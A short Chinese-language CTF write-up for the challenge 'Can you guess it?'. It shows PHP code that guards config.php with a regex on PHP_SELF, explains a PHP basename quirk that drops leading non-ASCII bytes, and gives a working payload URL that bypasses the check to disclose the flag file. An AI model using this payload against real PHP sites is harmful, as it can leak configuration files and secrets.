---
title: Can you guess it?
date: 2021-04-03 15:38:47
tags: wp

---
## '0'    



	```php
	<?php
	include 'config.php'; // FLAG is defined in config.php
	
	if (preg_match('/config\.php\/*$/i', $_SERVER['PHP_SELF'])) {
	  exit("I don't know what you are thinking, but I won't let you read it :)");
	}
	
	if (isset($_GET['source'])) {
	  highlight_file(basename($_SERVER['PHP_SELF']));
	  exit();
	}
	```


`$_SERVER[''PHP_SELF'']`----->获取网页地址        
下面的是个幌子         
[basename漏洞](https://bugs.php.net/bug.php?id=62119)----->会去掉文件名开头的非ASCII值         
ascii的范围是`0~255`，但`128~255`没在表中       

payload：`/index.php/config.php/%ff?source`
